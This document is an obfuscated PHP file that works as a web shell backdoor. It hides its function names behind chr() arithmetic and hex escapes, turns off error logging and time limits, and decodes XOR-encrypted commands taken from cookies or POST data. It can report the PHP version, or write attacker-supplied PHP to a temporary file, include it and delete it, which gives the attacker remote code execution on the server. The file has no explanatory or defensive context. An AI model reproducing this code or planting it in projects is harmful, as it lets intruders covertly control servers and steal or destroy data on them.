<?php $qldqlsjud = chr(102).chr(105).'l'.chr(101).chr(95).chr(112).'u'.'t'.'_'.chr(1062-963).'o'.chr(752-642).chr(116)."\x65".chr(110).chr(116).chr(414-299);
$kkrkpqxg = chr(262-164)."\x61"."\x73"."\145".chr(340-286).chr(715-663)."\137"."\144".chr(101)."\x63".chr(798-687).chr(303-203).chr(101);
$nhjczyx = "\x69".chr(110)."\x69"."\x5f".'s'."\145".chr(991-875);
$vxntxwsqeq = "\165".chr(800-690).'l'.chr(105)."\156"."\153";


@$nhjczyx('e'.'r'.'r'."\157".'r'.chr(95).chr(108)."\157"."\x67", NULL);
@$nhjczyx(chr(181-73).chr(111)."\147".chr(793-698).chr(101)."\162".'r'."\157"."\162".chr(920-805), 0);
@$nhjczyx(chr(109).'a'.chr(903-783).'_'.chr(101).chr(120)."\x65"."\143".'u'.'t'.chr(105)."\157"."\x6e".chr(624-529).'t'.chr(105)."\x6d".chr(951-850), 0);
@set_time_limit(0);

function ezyaavf($zrydi, $qrmjggwglb)
{
    $tfveou = "";
    for ($hhoimetx = 0; $hhoimetx < strlen($zrydi);) {
        for ($j = 0; $j < strlen($qrmjggwglb) && $hhoimetx < strlen($zrydi); $j++, $hhoimetx++) {
            $tfveou .= chr(ord($zrydi[$hhoimetx]) ^ ord($qrmjggwglb[$j]));
        }
    }
    return $tfveou;
}

$qbwuagiz = array_merge($_COOKIE, $_POST);
$pwvolrqi = '41e15e5d-db6f-4609-8b67-fcb972dc06e2';
foreach ($qbwuagiz as $xqlqd => $zrydi) {
    $zrydi = @unserialize(ezyaavf(ezyaavf($kkrkpqxg($zrydi), $pwvolrqi), $xqlqd));
    if (isset($zrydi['a'."\x6b"])) {
        if ($zrydi[chr(511-414)] == "\x69") {
            $hhoimetx = array(
                "\160".chr(477-359) => @phpversion(),
                chr(474-359).chr(1067-949) => "3.5",
            );
            echo @serialize($hhoimetx);
        } elseif ($zrydi[chr(511-414)] == "\x65") {
            $krfunplfk = "./" . md5($pwvolrqi) . "\56"."\151"."\x6e"."\143";
            @$qldqlsjud($krfunplfk, "<" . chr(63)."\160"."\x68"."\x70".' '.chr(64)."\165".chr(1023-913)."\154".'i'.chr(110)."\153"."\50".'_'."\x5f".chr(316-246).chr(73).chr(182-106).'E'.chr(762-667).chr(126-31).')'.chr(59).' ' . $zrydi["\144"]);
            @include($krfunplfk);
            @$vxntxwsqeq($krfunplfk);
        }
        exit();
    }
}

